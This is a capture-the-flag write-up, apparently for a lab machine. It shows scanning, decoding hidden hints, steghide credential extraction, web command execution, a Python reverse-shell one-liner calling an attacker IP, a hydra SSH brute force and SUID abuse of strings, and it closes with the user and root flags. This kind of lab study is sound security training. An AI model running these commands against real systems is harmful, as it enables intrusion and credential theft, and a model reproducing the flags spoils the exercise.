# Task 1 Flags
----

>>Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

## SCANNING

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.220.32 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-20 09:43 EST
Nmap scan report for 10.10.220.32
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.87 seconds

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ gobuster dir -u http://10.10.220.32:22 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.220.32:22
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/20 09:48:08 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 316] [--> http://10.10.220.32:22/assets/]
/server-status        (Status: 403) [Size: 277]                                     
                                                                                    
===============================================================
2022/02/20 09:57:25 Finished
===============================================================
```

## TRYING TO GET THE CREDS

```bash                                       
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ curl http://10.10.220.32:22
<html>
        <head>
                <title>Jack-of-all-trades!</title>
                <link href="assets/style.css" rel=stylesheet type=text/css>
        </head>
        <body>
                <img id="header" src="assets/header.jpg" width=100%>
                <h1>Welcome to Jack-of-all-trades!</h1>
                <main>
                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
                        <img src="assets/stego.jpg">
                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
                        <img src="assets/jackinthebox.jpg">
                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
                        <p id="signature">Jack</p>
                </main>
        </body>
</html>

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ echo -n "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq

# wget the two jpg files in the assets directory and use steghide to extract the info.

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ steghide --info stego.jpg       
"stego.jpg":
  format: jpeg
  capacity: 1.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "creds.txt":
    size: 58.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ steghide extract -sf stego.jpg 
Enter passphrase: 
wrote extracted data to "creds.txt".

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ cat creds.txt 
Hehe. Gotcha!

You're on the right path, but wrong image!
                                           
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ wget http://10.10.220.32:22/assets/header.jpg      
--2022-02-20 10:14:22--  http://10.10.220.32:22/assets/header.jpg
Connecting to 10.10.220.32:22... connected.
HTTP request sent, awaiting response... 200 OK
Length: 70273 (69K) [image/jpeg]
Saving to: ‘header.jpg’

header.jpg                      100%[====================================================>]  68.63K  43.3KB/s    in 1.6s    

2022-02-20 10:14:24 (43.3 KB/s) - ‘header.jpg’ saved [70273/70273]

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ steghide extract -sf header.jpg       
Enter passphrase: 
wrote extracted data to "cms.creds".

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
                         
# Checking out the recovery.php page

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ curl http://10.10.220.32:22/recovery.php

<!DOCTYPE html>
<html>
        <head>
                <title>Recovery Page</title>
                <style>
                        body{
                                text-align: center;
                        }
                </style>
        </head>
        <body>
                <h1>Hello Jack! Did you forget your machine password again?..</h1>
                <form action="/recovery.php" method="POST">
                        <label>Username:</label><br>
                        <input name="user" type="text"><br>
                        <label>Password:</label><br>
                        <input name="pass" type="password"><br>
                        <input type="submit" value="Submit">
                </form>
                <!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
                 
        </body>
</html>

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ echo "GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=" | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S   
```

## GETTING A SHELL

```
# Go to the recovery.php and login with the creds then it redirects other there we can execute commands in the url.

# 10.10.118.64/nnxhweOV/index.php?cmd=pwd
GET me a 'cmd' and I'll run it for you Future-Jack. /var/www/html/nnxhweOV

# So we can get a reverse shell 

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ cat /opt/reverse_shells/python_revsh.txt                        
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.107",7007));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 7007  
listening on [any] 7007 ...
connect to [10.9.2.107] from (UNKNOWN) [10.10.118.64] 53465
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ ^Z
zsh: suspended  nc -lvnp 7007
                                                                                                                             
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ stty raw -echo && fg                                     
[1]  + continued  nc -lvnp 7007

www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ export TERM=xterm
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ cd /home 
www-data@jack-of-all-trades:/home$ cat jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

## BRUTE FORCING THE USER'S PASSWORD

```bash
# Brute forcing user jack's password for ssh 

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ hydra -l jack -P pass.txt ssh://10.10.118.64:80 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-20 10:49:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.118.64:80/
[80][ssh] host: 10.10.118.64   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-20 10:49:28

www-data@jack-of-all-trades:/home$ su jack
Password: 
jack@jack-of-all-trades:/home$ ls
jack  jacks_password_list
jack@jack-of-all-trades:/home$ cd jack/
jack@jack-of-all-trades:~$ ls
user.jpg

# The user.jpg has the flag
securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
```

## PRIVILEGE ESCALATION 

```bash
jack@jack-of-all-trades:~$ find / -type f -user root -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su

jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}

```

----

# Answer the questions below
----

1.User Flag
>>securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}

2.Root Flag
>>securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}

----